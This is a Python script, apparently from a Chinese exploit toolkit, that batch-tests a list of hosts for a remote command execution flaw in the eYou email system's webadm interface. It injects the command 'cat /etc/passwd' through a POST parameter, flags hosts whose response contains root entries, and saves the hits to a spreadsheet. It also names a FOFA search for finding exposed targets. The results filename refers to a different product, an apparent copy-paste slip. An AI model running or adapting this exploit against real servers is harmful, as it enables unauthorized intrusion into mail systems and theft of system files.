
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork

def help():
    print('''
    fofa: body="亿邮电子邮件系统"
        1. 亿邮电子邮件系统 RCE webadm利用, 批量测试
    x. 退出
    ''')

def vul_webadm(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    body = "type='|cat /etc/passwd||'"
    method = "POST"
    path = "/webadm/?q=moni_detail.do&action=gragh"
    notes = ""
    return (url, method, headers, body, path, notes)

def run():
    OUTDIR = "result/忆邮电子邮件系统"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_webadm(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            try:
                response = v[-1]
                if v[1] != 200 and ':root' in response.text:
                    print(f'[+] {v[0]} -> RCE')
            except Exception as E:
                pass
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}用友NC BeanShell RCE.xlsx")

    else:
        print('bye....')
